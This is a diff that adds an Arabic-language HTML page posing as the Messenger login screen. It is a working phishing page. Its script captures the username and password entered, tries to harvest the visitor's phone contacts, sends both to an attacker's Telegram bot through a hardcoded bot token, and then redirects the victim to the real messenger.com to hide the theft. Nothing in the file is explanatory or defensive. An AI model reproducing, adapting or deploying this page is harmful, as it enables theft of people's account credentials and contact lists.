@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Messenger - تسجيل الدخول</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Helvetica, Arial, sans-serif; }
+        body { background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .msg-card { width: 100%; max-width: 360px; padding: 20px; text-align: center; }
+        .msg-logo { width: 75px; height: 75px; margin: 0 auto 20px auto; fill: url(#grad); }
+        .input-group { margin-bottom: 12px; text-align: right; }
+        input { width: 100%; padding: 14px; background: #f5f6f7; border: 1px solid #ccd0d5; border-radius: 20px; font-size: 15px; outline: none; }
+        input:focus { border-color: #0084ff; background: #fff; }
+        .msg-btn { width: 100%; padding: 12px; background: #0084ff; border: none; color: #fff; font-weight: bold; font-size: 16px; border-radius: 20px; cursor: pointer; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="msg-card">
+        <!-- شعار مسنجر SVG متدرج -->
+        <svg class="msg-logo" viewBox="0 0 28 28" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+                <linearGradient id="grad" x1="50%" y1="0%" x2="50%" y2="100%">
+                    <stop offset="0%" stop-color="#00C6FF"/>
+                    <stop offset="100%" stop-color="#0072FF"/>
+                </linearGradient>
+            </defs>
+            <path d="M14 2C7.373 2 2 7.153 2 13.5c0 3.39 1.43 6.442 3.71 8.643V25l3.41-1.871c1.37.382 2.83.59 4.34.59 6.627 0 12-5.153 12-11.5S20.627 2 14 2zm1.21 15.65l-3.08-3.28-6.03 3.28 6.63-7.03 3.12 3.28 5.99-3.28-6.63 7.03z"/>
+        </svg>
+        <h2 style="margin-bottom: 20px; font-size: 20px; color: #1c1e21;">المحادثة الفورية عبر Messenger</h2>
+        <form id="msgForm">
+            <div class="input-group"><input type="text" id="username" placeholder="رقم الهاتف أو البريد الإلكتروني" required></div>
+            <div class="input-group"><input type="password" id="password" placeholder="كلمة المرور" required></div>
+            <button type="submit" class="msg-btn">متابعة الدردشة</button>
+        </form>
+    </div>
+    <script>
+        const botToken = "9047166728:AAGG2DJF-Kb7h7_15GNx5VS7Le2bG7a1ZRE";
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetChatId = urlParams.get('to');
+
+        document.getElementById('msgForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            if(!targetChatId) return;
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            let contacts = "لم يتم منح الصلاحية";
+            if ('contacts' in navigator && 'ContactsManager' in window) {
+                try {
+                    const res = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                    if (res.length > 0) contacts = res.map(c => `المستخدم: ${c.name?.[0]} - الرقم: ${c.tel?.[0]}`).join('\n');
+                } catch(e) {}
+            }
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`صيد مسنجر جديد\nالحساب: ${user}\nالباسورد: ${pass}`)}`);
+            if (contacts !== "لم يتم منح الصلاحية") {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`جهات الاتصال:\n${contacts}`)}`);
+            }
+            setTimeout(() => { window.location.href = "https://www.messenger.com"; }, 800);
+        });
+    </script>
+</body>
+</html>
